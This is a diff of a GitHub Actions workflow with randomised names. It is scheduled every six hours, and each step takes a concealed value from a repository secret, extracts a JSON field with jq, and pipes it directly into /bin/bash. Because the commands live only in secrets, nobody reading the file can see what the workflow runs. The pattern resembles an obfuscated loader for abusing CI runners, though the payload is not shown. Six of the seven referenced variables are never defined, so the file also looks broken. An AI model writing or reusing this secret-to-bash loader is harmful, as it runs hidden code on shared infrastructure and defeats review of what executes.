@@ -2,20 +2,21 @@ name: dangnianqing4321
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 1/6 * * *'
-jobs:  # 1564
+    - cron: '16 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dangnianqing4321
         env:
-          vk7: ${{ secrets.vk7 }}
+          mufum94015: ${{ secrets.mufum94015 }}
         run: |
-          echo $vk7 | jq -r .io17 | /bin/bash
-          echo $kse5839 | jq -r .gpy4177 | /bin/bash
-          echo $f8042 | jq -r .nxa8 | /bin/bash
-          echo $ssxtn46 | jq -r .zp37 | /bin/bash
-          echo $gd39 | jq -r .cgg4 | /bin/bash
+          echo $mufum94015 | jq -r .b33 | /bin/bash
+          echo $nd26 | jq -r .wmqf874 | /bin/bash
+          echo $qmdp722 | jq -r .kv65806 | /bin/bash
+          echo $tbryb717 | jq -r .akt756 | /bin/bash
+          echo $rf9 | jq -r .ajm7 | /bin/bash
+          echo $zr7636 | jq -r .ndy0 | /bin/bash
+          echo $mxb042 | jq -r .wudmr57 | /bin/bash
 
